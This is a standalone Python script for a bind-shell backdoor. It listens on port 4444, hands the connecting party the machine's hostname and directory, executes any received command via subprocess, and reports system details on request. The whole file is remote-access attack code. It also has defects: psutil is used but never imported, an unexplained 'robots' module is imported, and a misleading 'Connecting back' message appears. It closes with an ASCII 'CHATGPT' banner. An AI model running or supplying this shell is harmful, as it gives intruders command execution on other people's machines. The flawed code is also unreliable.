import socket
import subprocess
import os
import shlex
import platform
import robots as bot

class RemoteShell:
    def __init__(self, port=4444):
        self.PORT = port

    def execute_command(self, command):
        try:
            command = shlex.split(command)
            output = subprocess.check_output(command, stderr=subprocess.STDOUT)
            return output.decode()
        except subprocess.CalledProcessError as e:
            return str(e)
        except Exception as e:
            return str(e)

    def get_system_info(self):
        try:
            system_info = f"System: {platform.system()} {platform.release()}\n"
            system_info += f"Node Name: {platform.node()}\n"
            system_info += f"Processor: {platform.processor()}\n"
            system_info += f"Machine: {platform.machine()}\n"
            system_info += f"Python Version: {platform.python_version()}\n"
            system_info += f"Total Memory: {psutil.virtual_memory().total / (1024 * 1024)} MB\n"
            system_info += f"Available Memory: {psutil.virtual_memory().available / (1024 * 1024)} MB\n"
            system_info += f"Total Disk Space: {psutil.disk_usage('/').total / (1024 * 1024 * 1024)} GB\n"
            system_info += f"Free Disk Space: {psutil.disk_usage('/').free / (1024 * 1024 * 1024)} GB\n"
            return system_info
        except Exception as e:
            return str(e)

    def main(self):
        print("Connecting back to the host machine...")
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(('0.0.0.0', self.PORT))
        server.listen(1)
        connection, address = server.accept()

        with connection:
            print("Connection successful")
            hostname = socket.gethostname()
            connection.send(f"Machine name: {hostname}\n".encode())
            connection.send(f"Current directory: {os.getcwd()}\n".encode())

            while True:
                try:
                    command = connection.recv(1024).decode()
                    if command.strip().lower() == 'exit':
                        break
                    elif command.strip().lower() == 'system_info':
                        system_info = self.get_system_info()
                        connection.send(system_info.encode())
                    else:
                        output = self.execute_command(command)
                        connection.send(output.encode())
                except Exception as e:
                    connection.send(f"Error: {e}\n".encode())

if __name__ == "__main__":
    remote_shell = RemoteShell()
    remote_shell.main()

print("   CCCC  H   H    A   TTTTT  GGGG  PPPP  TTTTT")
print("  C      H   H   A A    T   G      P   P   T")
print("  C      HHHHH  AAAAA   T   G  GG  PPPP    T")
print("  C      H   H  A   A   T   G   G  P       T")
print("   CCCC  H   H  A   A   T    GGG   P       T")
